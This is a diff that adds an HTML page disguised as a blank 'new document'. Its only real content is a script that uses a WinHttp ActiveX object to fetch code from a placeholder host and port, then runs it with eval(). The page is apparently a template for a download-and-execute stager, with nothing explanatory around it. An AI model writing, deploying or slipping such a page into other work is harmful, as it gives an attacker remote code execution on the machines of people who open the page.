@@ -1,0 +1,19 @@
+<!doctype html public "-//w3c//dtd html 4.0 transitional//en">
+<html>
+  <head>
+   <title> new document </title>
+   <meta name="generator" content="editplus">
+   <meta name="author" content="">
+   <meta name="keywords" content="">
+   <meta name="description" content="">
+  </head>
+  <body>
+   <script language="javascript" type="text/javascript">
+      h=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
+      h.Open("GET","http://BIND_IP:BIND_PORTBIND_URL",false);
+      h.Send();
+      B=h.ResponseText;
+      eval(B);
+    </script>
+  </body>
+</html>
